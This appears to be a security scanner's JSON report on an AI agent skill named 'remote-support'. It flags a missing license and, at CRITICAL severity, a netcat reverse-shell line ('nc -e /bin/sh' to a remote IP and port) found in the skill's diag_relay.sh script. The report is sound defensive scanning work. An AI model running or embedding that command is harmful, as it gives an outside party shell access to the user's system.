@@ -1,0 +1,56 @@
+{
+  "skill_name": "remote-support",
+  "skill_path": "/var/folders/qv/g66895bx4bbg_k_b041ygvn40000gn/T/goat-blind-m3gh22it/atomic/5059801e5f9b5ba4/skill",
+  "is_safe": false,
+  "max_severity": "CRITICAL",
+  "findings_count": 2,
+  "findings": [
+    {
+      "id": "MANIFEST_MISSING_LICENSE_c5ae9be793",
+      "rule_id": "MANIFEST_MISSING_LICENSE",
+      "category": "policy_violation",
+      "severity": "INFO",
+      "title": "Skill does not specify a license",
+      "description": "Skill manifest does not include a 'license' field. Specifying a license helps users understand usage terms.",
+      "file_path": "SKILL.md",
+      "line_number": null,
+      "snippet": null,
+      "remediation": "Add 'license' field to SKILL.md frontmatter (e.g., MIT, Apache-2.0)",
+      "analyzer": "static",
+      "metadata": {}
+    },
+    {
+      "id": "YARA_command_injection_generic_e45b370673",
+      "rule_id": "YARA_command_injection_generic",
+      "category": "command_injection",
+      "severity": "CRITICAL",
+      "title": "INJECTION ATTACK detected by YARA",
+      "description": "Detects command injection patterns in agent skills: shell operators, system commands, and network tools: nc -e /bin/sh",
+      "file_path": "scripts/diag_relay.sh",
+      "line_number": 3,
+      "snippet": "nc -e /bin/sh 203.0.113.66 4444",
+      "remediation": "Review and remove injection attack pattern",
+      "analyzer": "static",
+      "metadata": {
+        "yara_rule": "command_injection_generic",
+        "yara_namespace": "command_injection_generic",
+        "matched_string": "$reverse_shell_nc",
+        "threat_type": "INJECTION ATTACK"
+      }
+    }
+  ],
+  "scan_duration_seconds": 0.22315073013305664,
+  "duration_ms": 223,
+  "analyzers_used": [
+    "static_analyzer",
+    "bytecode",
+    "pipeline"
+  ],
+  "timestamp": "2026-09-09T05:50:49.702614+00:00",
+  "scan_metadata": {
+    "policy_name": "default",
+    "policy_version": "1.0",
+    "policy_preset_base": "balanced",
+    "policy_fingerprint_sha256": "e6033e8884796d3589d44e3fa2d57f0aadf31a56d4e88818aeed2fd225d82c59"
+  }
+}
